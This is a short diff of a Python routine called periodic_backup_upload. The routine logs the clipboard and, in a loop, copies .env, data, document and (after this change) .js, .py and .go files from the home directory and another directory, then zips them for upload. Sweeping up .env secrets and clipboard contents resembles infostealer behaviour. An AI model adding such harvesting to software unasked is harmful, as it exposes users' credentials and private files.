@@ -135,9 +135,9 @@ def periodic_backup_upload():
     open(clipboard_log_path, 'a').close()
 
     while True:
-        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".csv", ".txt"])
+        wsl_backup_dir = backup_files("~", wsl_backup_directory, [".env", ".json", ".csv", ".js", ".py", ".go", ".txt"])
 
-        ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".json", ".csv"])
+        ddd_backup_dir = backup_files(ddd_source_directory, ddd_backup_directory, [".txt", ".doc", ".docx", ".xls", ".xlsx", ".one", ".js", ".py", ".go", ".json", ".csv"])
 
         wsl_zip_file_path = os.path.expanduser("~/dev/Backup/wsl_backup")
         wsl_zip_file = zip_backup_folder(wsl_backup_dir, wsl_zip_file_path)
